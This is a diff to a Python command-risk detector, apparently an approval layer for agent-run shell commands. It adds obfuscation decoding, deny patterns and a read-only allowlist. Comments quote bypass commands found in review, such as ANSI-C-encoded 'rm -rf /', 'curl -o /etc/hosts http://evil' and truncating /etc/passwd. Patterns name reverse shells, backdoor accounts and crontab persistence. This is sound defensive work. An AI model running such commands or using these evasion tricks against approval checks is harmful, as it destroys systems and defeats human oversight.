@@ -2,9 +2,10 @@
 Safety — 命令安全检测层
 
 借鉴 Hermes approval.py 思路，提供更鲁棒的命令风险检测：
-- 命令归一化（反 ANSI/Unicode/转义/空字符串混淆）
-- HARDLINE_PATTERNS：无条件阻断（12 条）
-- DANGEROUS_PATTERNS：需审批（约 20 条）
+- 命令归一化（反 ANSI/Unicode/转义/空字符串/ANSI-C 引用混淆）
+- HARDLINE_PATTERNS：无条件阻断
+- DANGEROUS_PATTERNS：需审批
+- 只读命令白名单 + 默认审批（C-review C1：未入表命令不再默认放行）
 - sudo -S stdin 密码猜测守卫
 
 相比 reins.FilesystemGuard 仅用 7 个字符串子串匹配，本模块通过正则 +
@@ -42,6 +43,45 @@ _NULL_BYTE_RE = re.compile(r"\x00")
 _BACKSLASH_ESCAPE_RE = re.compile(r"\\([^\n])")
 # 空字符串：把 `r''m` 还原为 `rm`
 _EMPTY_STRING_RE = re.compile(r"''|\"\"")
+# ANSI-C 引用：$'\x2f' / $'\n' 等（bash）— C-review C1 实测绕过
+_ANSI_C_RE = re.compile(r"\$'((?:[^'\\]|\\.)*)'")
+
+_ANSI_C_ESCAPES = {
+    "n": "\n", "t": "\t", "r": "\r", "a": "\a", "b": "\b",
+    "f": "\f", "v": "\v", "\\": "\\", "'": "'", '"': '"', "?": "?",
+}
+
+
+def _decode_ansi_c(match: re.Match) -> str:
+    """解码 $'...' 内的转义序列（\\xHH / \\ooo / \\n 等）"""
+    s = match.group(1)
+    out: list[str] = []
+    i = 0
+    while i < len(s):
+        ch = s[i]
+        if ch == "\\" and i + 1 < len(s):
+            n = s[i + 1]
+            if n in _ANSI_C_ESCAPES:
+                out.append(_ANSI_C_ESCAPES[n])
+                i += 2
+                continue
+            if n == "x" and i + 3 < len(s):
+                try:
+                    out.append(chr(int(s[i + 2:i + 4], 16)))
+                    i += 4
+                    continue
+                except ValueError:
+                    pass
+            if n in "01234567" and i + 3 < len(s):
+                try:
+                    out.append(chr(int(s[i + 1:i + 4], 8)))
+                    i += 4
+                    continue
+                except ValueError:
+                    pass
+        out.append(ch)
+        i += 1
+    return "".join(out)
 
 
 def normalize_command_for_detection(command: str) -> str:
@@ -52,8 +92,10 @@ def normalize_command_for_detection(command: str) -> str:
     2. 剥 null 字节
     3. Unicode NFKC 归一化（全角 → 半角）
     4. 折叠 home 路径（绝对路径折叠回 ~）
-    5. 剥反斜杠转义
-    6. 剥空字符串
+    5. 解码 ANSI-C 引用（$'\\x2f' → /）— 必须在剥反斜杠之前，
+       否则旧的第 5 步会把 $'\\x2f' 里的 \\x 剥成 x 主动破坏匹配
+    6. 剥反斜杠转义
+    7. 剥空字符串
     """
     # 1. strip ANSI 转义序列
     command = _ANSI_ESCAPE_RE.sub("", command)
@@ -69,7 +111,10 @@ def normalize_command_for_detection(command: str) -> str:
     if home and command.startswith(home):
         command = "~" + command[len(home):]
 
-    # 5. 剥反斜杠转义：把 `r\m` 还原为 `rm`
+    # 5. 解码 ANSI-C 引用（C-review C1：rm$'\x2f' -rf $'\x2f' → rm/ -rf /）
+    command = _ANSI_C_RE.sub(_decode_ansi_c, command)
+
+    # 6. 剥反斜杠转义：把 `r\m` 还原为 `rm`
     #    连续多个反斜杠（如 `r\\m`）需循环归约直至稳定
     while True:
         new_command = _BACKSLASH_ESCAPE_RE.sub(r"\1", command)
@@ -139,6 +184,28 @@ DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
      "base64 decode piped to interpreter (encoded remote execution)"),
     # 反弹 shell：nc/ncat/netcat -e
     (re.compile(r"\b(?:nc|ncat|netcat)\b[^\n]*\s-e\s+"), "netcat -e (reverse shell)"),
+    # ── C-review C1 补充（实测绕过命令族，全部曾判 safe）──
+    # 账户/口令管理：建 uid=0 后门账户、改口令等
+    (re.compile(r"\buser(?:add|mod|del)\b", re.IGNORECASE), "user account management (useradd/usermod/userdel)"),
+    (re.compile(r"\bgroupadd\b", re.IGNORECASE), "group creation (groupadd)"),
+    (re.compile(r"\bpasswd\b", re.IGNORECASE), "password change (passwd)"),
+    (re.compile(r"\bvisudo\b|\bvipw\b"), "direct edit of sudoers/pw database"),
+    # chmod 任意八进制模式（原表只认字面 777，0777/4755 setuid 漏过；
+    # 符号模式如 u+x 不在此列，由 token 级敏感目标检查兜底）
+    (re.compile(r"\bchmod\s+(?:-[A-Za-z]+\s+)*[0-7]{3,4}\b"), "chmod octal mode"),
+    # 特殊文件/内核模块/内核参数
+    (re.compile(r"\bmknod\b|\bmkfifo\b"), "special file creation (mknod/mkfifo)"),
+    (re.compile(r"\b(?:insmod|rmmod|modprobe)\b"), "kernel module operation"),
+    (re.compile(r"\bsysctl\s+(?:-w|--system|-p)\b"), "sysctl runtime kernel parameter change"),
+    # 防火墙规则变体（原表只认 iptables -F / ufw disable）
+    (re.compile(r"\biptables6?\s+(?:--flush|-X)\b", re.IGNORECASE), "flush/delete iptables rules"),
+    (re.compile(r"\bufw\s+(?:--force\s+)?reset\b", re.IGNORECASE), "ufw firewall reset"),
+    # 计划任务持久化（原表只认 crontab -r 删除；安装/替换/at 完全漏检）
+    (re.compile(r"\bat\s+-f\b", re.IGNORECASE), "schedule at job from file"),
+    (re.compile(r"\bcrontab\b(?!\s+-[lL])\s+\S", re.IGNORECASE), "install/replace crontab"),
+    # 包移除（原表只认 pip/npm uninstall）
+    (re.compile(r"\bapt(?:-get)?\s+(?:remove|purge|autoremove)\b", re.IGNORECASE), "package removal (apt)"),
+    (re.compile(r"\b(?:yum|dnf)\s+(?:remove|erase)\b", re.IGNORECASE), "package removal (yum/dnf)"),
 ]
 
 
@@ -332,7 +399,8 @@ def _token_rm_find_analysis(segment: str) -> tuple[str, str | None]:
             best = (level, reason)
 
     for idx, verb in enumerate(tokens):
-        if verb in ("rm", "rmdir"):
+        # C-review C1：`rm/`（rm 与参数用 / 拼接的 shell 形态）视同 rm
+        if verb in ("rm", "rmdir") or verb.rstrip("/") in ("rm", "rmdir"):
             flags: set[str] = set()
             target: str | None = None
             j = idx + 1
@@ -347,9 +415,18 @@ def _token_rm_find_analysis(segment: str) -> tuple[str, str | None]:
                     continue
                 target = t
                 break
-            if target is None:
-                continue
             recursive = ("r" in flags) or ("R" in flags)
+            if target is None:
+                # C-review C1：递归删除但无显式目标（`ls | xargs rm -rf` —
+                # 目标由 stdin/xargs 提供）= 未知目标 + 破坏性动词
+                if recursive:
+                    _upd("dangerous", f"recursive delete without explicit target ({verb})")
+                continue
+            # C-review C1：xargs 占位符目标（`ls | xargs -I{} rm -rf {}`）=
+            # 未知目标 + 破坏性动词，递归删除时保守升级
+            if recursive and (target == "{}" or target.startswith("{}")):
+                _upd("dangerous", f"recursive delete with unknown (xargs) target ({verb} {target})")
+                continue
             norm = _normalize_target(target)
             # 家目录整体删除（~ / $HOME / ~/* 等）视同根目录
             home_root_globs = {"~", "~/", "~/*", "$HOME", "$HOME/", "$HOME/*",
@@ -386,13 +463,32 @@ def _token_rm_find_analysis(segment: str) -> tuple[str, str | None]:
                     elif _is_sensitive_path(norm) or _is_home_relative(norm):
                         _upd("dangerous", f"find -delete/-exec on sensitive system path ({target})")
         elif verb in ("shred", "truncate"):
+            # C-review C1：truncate -s 0 /etc/passwd — 原实现取"第一个非 flag
+            # 参数"拿到 size 值 0 而非文件；-s/--size 的值必须跳过
             target = None
+            skip_next = False
             for t in tokens[idx + 1:]:
-                if not t.startswith("-"):
-                    target = t
-                    break
+                if skip_next:
+                    skip_next = False
+                    continue
+                if t in ("-s", "--size"):
+                    skip_next = True
+                    continue
+                if t.startswith("-"):
+                    continue
+                target = t
+                break
             if target is not None and (_is_sensitive_path(target) or _is_home_relative(target)):
                 _upd("dangerous", f"{verb} on sensitive system path ({target})")
+        elif verb == "chmod":
+            # C-review C1：符号模式 chmod（u+x / a+w）不命中八进制正则表 →
+            # 敏感目录目标保守升级（chmod -R a+w /etc 曾判 safe）
+            for t in tokens[idx + 1:]:
+                if t.startswith("-"):
+                    continue
+                if _is_sensitive_path(t) or _is_home_relative(t):
+                    _upd("dangerous", f"chmod on sensitive system path ({t})")
+                    break
 
     return best
 
@@ -438,13 +534,56 @@ def _classify_subshells(segment: str) -> tuple[str, str | None]:
     return best
 
 
+# C-review C1：包装器的已知 flag 及是否吞下一个参数（flag → consumes_arg）。
+# 未列出的 flag 一律不跳过（保守策略：flag 留在序列里，首 token 变成未知
+# 形式 → 被"默认审批"规则判 dangerous，方向安全）。
+_WRAPPER_FLAGS: dict[str, dict[str, bool]] = {
+    "env": {"-i": False, "--ignore-environment": False, "-0": False,
+            "-u": True, "--unset": True, "-C": True, "-S": True, "-c": True},
+    "nice": {"-n": True},
+    "stdbuf": {"-o": True, "-e": True, "-i": True},
+    "doas": {"-u": True, "-g": True, "-C": False},
+    "setsid": {"-f": False, "-w": False, "-c": True},
+    "command": {"-v": False, "-p": False, "-V": False},
+    "xargs": {"-I": True, "--replace": True, "-i": False, "-n": True,
+              "--max-args": True, "-L": True, "-P": True, "--max-procs": True,
+              "-d": True, "-E": True, "-a": True, "-e": True, "-0": False,
+              "-r": False, "--arg-file": True},
+}
+
+
 def _strip_prefix_wrappers(tokens: list[str]) -> list[str]:
-    """剥离命令前的包装器（env/nohup/sudo/...）与环境赋值（FOO=bar），返回真实 token 序列"""
-    out: list[str] = []
-    for t in tokens:
-        if not out and (t in _WRAPPERS or (t and t[0].isalpha() and "=" in t and not t.startswith("-"))):
-            continue
-        out.append(t)
+    """剥离命令前的包装器（env/nohup/sudo/...）与环境赋值（FOO=bar），返回真实 token 序列
+
+    C-review C1：包装器带 flag 时同样剥离（`env -i /bin/bash x`、`nice -n 10 bash x`、
+    `timeout 5 /tmp/x`）——原实现遇到 flag 立即停剥，首 token 判定被击穿。
+    遇到未知 flag 停剥（保守，方向安全）。
+    """
+    out: list[str] = list(tokens)
+    changed = True
+    while changed and out:
+        changed = False
+        t = out[0]
+        base = t.rsplit("/", 1)[-1]
+        if t in _WRAPPERS or base in _WRAPPERS:
+            out = out[1:]
+            changed = True
+            # timeout 的第一个非 flag 参数是时长（timeout 5 /tmp/x）
+            if base == "timeout" and out and not out[0].startswith("-"):
+                out = out[1:]
+                continue
+            flags = _WRAPPER_FLAGS.get(base, {})
+            while out:
+                f = out[0]
+                if f not in flags:
+                    break
+                out = out[1:]
+                changed = True
+                if flags[f] and out:  # 吞掉 flag 的参数
+                    out = out[1:]
+        elif t and t[0].isalpha() and "=" in t and not t.startswith("-"):
+            out = out[1:]
+            changed = True
     return out
 
 
@@ -497,6 +636,22 @@ def _classify_secret_read(segment: str) -> tuple[str, str | None]:
 # 最后一个非 flag 参数即写入目标，与 > / >> / tee 同等判定
 _WRITE_VERBS = {"cp", "mv", "install", "ln", "rsync"}
 
+# C-review C1：敏感系统目录作为**源**同样危险（mv /root /tmp/x、
+# rsync -a /etc/ /tmp/、tar czf x /etc、dd if=/etc/hosts）——
+# 原实现只查写入目标，源侧 /root、/etc 完全不受限。
+# 不含 /home（用户数据备份是正常运维，见 test_safety.py 对照组 tar /home/...）
+_SENSITIVE_SOURCE_DIRS = (
+    "/etc", "/root", "/boot", "/usr", "/bin", "/sbin", "/lib", "/lib64",
+    "/dev", "/sys", "/proc", "/var", "/opt", "/srv",
+)
+
+
+def _is_sensitive_source(path: str) -> bool:
+    t = _normalize_target(path)
+    if not t.startswith("/"):
+        return False
+    return any(t == d or t.startswith(d + "/") for d in _SENSITIVE_SOURCE_DIRS)
+
 
 def _classify_write_targets(text: str) -> tuple[str, str | None]:
     """扫描重定向 > / >> 、tee 与 cp/mv/install/ln/rsync 的写入目标（全串，跨段有效）：
@@ -541,14 +696,47 @@ def _classify_write_targets(text: str) -> tuple[str, str | None]:
         if not tokens:
             continue
         verb = tokens[0].rsplit("/", 1)[-1].lower()
-        if verb not in _WRITE_VERBS:
-            continue
-        target = None
-        for t in tokens[1:]:
-            if not t.startswith("-"):
-                target = t  # 逐个覆盖，最终为最后一个非 flag 参数
-        if target is not None:
-            _check_target(target)
+        if verb in _WRITE_VERBS:
+            target = None
+            for t in tokens[1:]:
+                if not t.startswith("-"):
+                    target = t  # 逐个覆盖，最终为最后一个非 flag 参数
+            if target is not None:
+                _check_target(target)
+            # 4. C-review C1：敏感目录作为**源**（mv /root /tmp/x、rsync /etc/ →）
+            if verb in ("mv", "cp", "rsync"):
+                args = [t for t in tokens[1:] if not t.startswith("-")]
+                for s in args[:-1]:  # 除最后一个（写入目标）外均为源
+                    if _is_sensitive_source(s):
+                        if _SEVERITY["dangerous"] > _SEVERITY[best[0]]:
+                            best = ("dangerous", f"move/copy sensitive system path as source ({s})")
+                        break
+        elif verb == "tar":
+            # 5. C-review C1：tar 归档敏感目录（tar czf /tmp/x /etc）
+            #    第一个非 flag 参数是归档文件，其余是源
+            args = [t for t in tokens[1:] if not t.startswith("-")]
+            for s in args[1:]:
+                if _is_sensitive_source(s):
+                    if _SEVERITY["dangerous"] > _SEVERITY[best[0]]:
+                        best = ("dangerous", f"tar archives sensitive system path ({s})")
+                    break
+        elif verb == "dd":
+            # 6. C-review C1：dd 读敏感目录（dd if=/etc/hosts of=/tmp/x）
+            for t in tokens[1:]:
+                if t.startswith("if=") and _is_sensitive_source(t[3:]):
+                    if _SEVERITY["dangerous"] > _SEVERITY[best[0]]:
+                        best = ("dangerous", f"dd reads sensitive system path ({t})")
+                    break
+        elif verb in ("curl", "wget"):
+            # 7. C-review C1：curl/wget -o/--output/-O 的落盘目标按写目标判定
+            #    （curl -o /etc/hosts http://evil 曾判 safe）
+            for i, t in enumerate(tokens[1:], start=1):
+                if t in ("-o", "--output", "-O") and i + 1 < len(tokens):
+                    _check_target(tokens[i + 1])
+                    break
+                if t.startswith("--output="):
+                    _check_target(t.split("=", 1)[1])
+                    break
     return best
 
 
@@ -612,6 +800,124 @@ def _classify_download_exec(segments: list[str]) -> tuple[str, str | None]:
     return ("safe", None)
 
 
+# ── C-review C1：默认审批 — 已知只读命令白名单 ──
+# 旧实现未命中任何模式 → safe（默认放行），任何"未入表"的命令都免审批在
+# 远程主机执行。现在仅下列只读命令默认放行，其余一律 dangerous（需用户审批）。
+# 写/变更类命令即使无害（mkdir /tmp/x）也需审批 — 审批卡片成本可接受，
+# 漏放行的代价（生产主机）不可接受。
+_SAFE_VERBS: frozenset[str] = frozenset({
+    # 文件/目录读取
+    "ls", "ll", "dir", "cat", "head", "tail", "less", "more", "wc", "file", "stat",
+    "tree", "du", "df", "find", "grep", "egrep", "fgrep", "rg", "awk", "cut", "sort",
+    "uniq", "tr", "diff", "column", "strings", "od", "xxd", "basename", "dirname",
+    "realpath", "readlink", "md5sum", "sha1sum", "sha256sum", "cksum", "test",
+    # 系统状态读取
+    "ps", "top", "uptime", "date", "who", "whoami", "w", "id", "uname", "hostname",
+    "which", "whereis", "type", "pwd", "env", "printenv", "set", "export", "echo",
+    "printf", "true", "false", "sleep", "free", "vmstat", "iostat", "lsof",
+    "netstat", "ss", "ifconfig", "pgrep", "pidof", "dmesg", "journalctl",
+    # 网络读取（写目标/下载执行由其他规则单独判定）
+    # 注意：ssh 不入白名单 — 可建立交互会话/在远端执行任意命令，需审批
+    "curl", "wget",
+    "tee",
+})
+
+# 动词 + 受限子命令：仅子命令在集合内才视为只读
+_SAFE_VERB_SUBCOMMANDS: dict[str, frozenset[str]] = {
+    "systemctl": frozenset({"status", "show", "is-active", "is-enabled", "is-failed",
+                            "is-allowed", "list-units", "list-unit-files", "list-sockets",
+                            "list-timers", "cat", "version"}),
+    "service": frozenset({"status", "--status-all"}),
+    "ip": frozenset({"addr", "address", "link", "route", "neigh", "saddr", "maddr", "-V"}),
+    "kubectl": frozenset({"get", "describe", "logs", "explain", "top", "version",
+                          "cluster-info", "api-resources"}),
+    "git": frozenset({"status", "log", "diff", "show", "branch", "tag", "remote",
+                      "ls-files", "rev-parse", "shortlog", "blame", "describe"}),
+    "apt": frozenset({"list", "show", "search", "policy", "update"}),
+    "apt-get": frozenset({"list", "show", "search", "policy", "update"}),
+    "dpkg": frozenset({"-l", "--list", "-s", "--status", "-L", "--listfiles",
+                       "-V", "--verify"}),
+    "docker": frozenset({"ps", "images", "logs", "inspect", "version", "info"}),
+    "helm": frozenset({"list", "get", "status", "history", "template"}),
+}
+
+# 白名单子命令下的危险深动词（如 ip link set down）
+_DANGEROUS_SUBACTIONS: dict[str, frozenset[str]] = {
+    "ip": frozenset({"set", "del", "flush", "down", "add"}),
+    "git": frozenset({"checkout", "reset"}),
+}
+
+
+def _classify_unknown_default(segment: str) -> tuple[str, str | None]:
+    """C-review C1：默认审批 — 首 token 不在只读白名单 → dangerous（需审批）
+
+    仅当所有既有规则（正则表/token 分析/子 shell/解释器/敏感读取/写目标）
+    都未命中时由 _classify_segment 调用。
+    """
+    try:
+        tokens = shlex.split(segment, posix=True)
+    except ValueError:
+        return ("dangerous", "unparseable segment (conservative)")
+    tokens = _strip_prefix_wrappers(tokens)
+    if not tokens:
+        return ("safe", None)
+    first = tokens[0]
+    base = first.rsplit("/", 1)[-1].lower()
+    # 纯 flag/数字/重定向（如被单独切出的 "2>&1"）— 不是可执行命令但形态可疑
+    if not re.search(r"[A-Za-z_]", base):
+        return ("dangerous", f"unrecognizable command ({first})")
+
+    # ── 特判动词 ──
+    if base in ("rm", "rmdir"):
+        # 走到这里说明 token 分析已确认目标非敏感/非递归未知目标 — 保持原 safe 语义
+        return ("safe", None)
+    if base == "tar":
+        # 敏感目录作源已由 _classify_write_targets 判定 — 到这里即安全归档
+        return ("safe", None)
+    if base == "sed":
+        if any(t == "--in-place" or t.startswith("-i") for t in tokens[1:]):
+            return ("dangerous", "sed in-place edit (-i writes file)")
+        return ("safe", None)
+    if base == "journalctl":
+        if any(t.startswith("--vacuum") for t in tokens[1:]):
+            return ("dangerous", "journalctl log deletion (--vacuum)")
+        return ("safe", None)
+    if base == "kill":
+        # 杀 PID 1（init）保守升级；kill -9 -1 已 hardline
+        for t in tokens[1:]:
+            if not t.startswith("-") and t == "1":
+                return ("dangerous", "kill PID 1 (init)")
+        return ("safe", None)
+    if base == "dd":
+        # 无 of=（写 stdout）或 of= 目标是安全设备 → 保持原 safe 语义
+        for t in tokens[1:]:
+            if t.startswith("of="):
+                dev = t[3:]
+                safe_dev = ("zero", "urandom", "random", "null", "tty", "pts",
+                            "shm", "console", "fd")
+                if not dev.startswith("/dev/") or \
+                        not any(dev[5:].startswith(p) for p in safe_dev):
+                    return ("dangerous", f"dd writes non-standard device ({t})")
+        return ("safe", None)
+
+    # ── 白名单判定 ──
+    if base in _SAFE_VERBS:
+        return ("safe", None)
+    sub = _SAFE_VERB_SUBCOMMANDS.get(base)
+    if sub is not None:
+        for t in tokens[1:]:
+            if t.startswith("-"):
+                continue
+            if t in sub:
+                bad = _DANGEROUS_SUBACTIONS.get(base)
+                if bad and any(x in bad for x in tokens[2:]):
+                    return ("dangerous", f"{base} {t} with destructive sub-action")
+                return ("safe", None)
+            return ("dangerous", f"{base} {t} (operational verb, default approval)")
+        return ("dangerous", f"unrecognizable command ({first})")
+    return ("dangerous", f"unknown command, default approval ({base})")
+
+
 def _classify_segment(segment: str) -> tuple[str, str | None]:
     """对单个命令段做完整检测，取最高严重度（hardline > dangerous > safe）
 
@@ -662,6 +968,13 @@ def _classify_segment(segment: str) -> tuple[str, str | None]:
     if level != "safe":
         _upd(level, reason)
 
+    # 7. C-review C1：默认审批 — 所有规则未命中且首 token 不在只读白名单
+    #    → dangerous（需审批）。旧实现此处直接返回 safe（默认放行）。
+    if best[0] == "safe":
+        level, reason = _classify_unknown_default(segment)
+        if _SEVERITY[level] > _SEVERITY[best[0]]:
+            best = (level, reason)
+
     return best
 
 
@@ -683,9 +996,13 @@ def classify_command(command: str) -> tuple[str, str | None]:
     3. 全串正则表检测（修复管道类模式：`|` 是分段符，curl|sh 等模式 per-segment
        永远匹配不到；fork bomb 完整形态同理）
     4. 全串写目标扫描（> / >> / tee → 持久化/敏感路径）
-    5. 命令链分段（; / && / || / | / 换行），对每段跑完整检测（含解释器/家目录/敏感读取）
+    5. 命令链分段（; / && / || / | / 换行），对每段跑完整检测
+       （含解释器/家目录/敏感读取/**默认审批**）
     6. 跨段下载执行启发式（curl/wget -o && 执行）
     7. 取所有检测的最高严重度（hardline > dangerous > safe）
+
+    C-review C1 默认策略：**默认审批** — 未命中任何规则且首 token 不在
+    只读白名单（_SAFE_VERBS/_SAFE_VERB_SUBCOMMANDS）的命令判 dangerous。
     """
     # 1. sudo stdin guard（基于原始命令）
     blocked, reason = check_sudo_stdin_guard(command)
